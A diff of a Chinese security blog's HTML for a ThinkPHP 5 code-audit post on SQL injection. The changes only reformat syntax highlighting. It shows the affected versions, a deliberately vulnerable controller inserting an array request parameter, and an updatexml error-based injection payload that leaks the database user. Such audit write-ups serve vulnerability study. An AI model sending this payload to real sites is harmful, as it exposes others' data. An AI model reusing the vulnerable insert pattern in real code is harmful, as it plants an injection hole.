@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="影响版本:5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5 漏洞环境首先配置application&#x2F;index&#x2F;controller&#x2F;Index.php &lt;?php namespace app\index\controller;  class Inde">
+        <meta name="description" content="影响版本:5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5 漏洞环境首先配置application&#x2F;index&#x2F;controller&#x2F;Index.php 123456789101112&lt;?phpnamespace app\index\controlle">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ThinkPHP5代码审计:SQL注入(二)">
 <meta property="og:url" content="http://example.com/2024/06/03/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C/index.html">
 <meta property="og:site_name" content="p0l1st&#39;s blog">
-<meta property="og:description" content="影响版本:5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5 漏洞环境首先配置application&#x2F;index&#x2F;controller&#x2F;Index.php &lt;?php namespace app\index\controller;  class Inde">
+<meta property="og:description" content="影响版本:5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5 漏洞环境首先配置application&#x2F;index&#x2F;controller&#x2F;Index.php 123456789101112&lt;?phpnamespace app\index\controlle">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221812398.png">
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221812602.png">
@@ -317,21 +317,10 @@
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
             <p>影响版本:5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5</p>
 <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>首先配置application&#x2F;index&#x2F;controller&#x2F;Index.php</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>
-
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username/a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token string single-quoted-string">'Update success'</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">insert</span>([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <p>payload:</p>
-<pre class="line-numbers language-none"><code class="language-none">username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]&#x3D;1 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 </span><br></pre></td></tr></table></figure></div>
 
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221812398.png" alt="image-20240603212607333"></p>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据上面的payload，首先跟进insert方法</p>
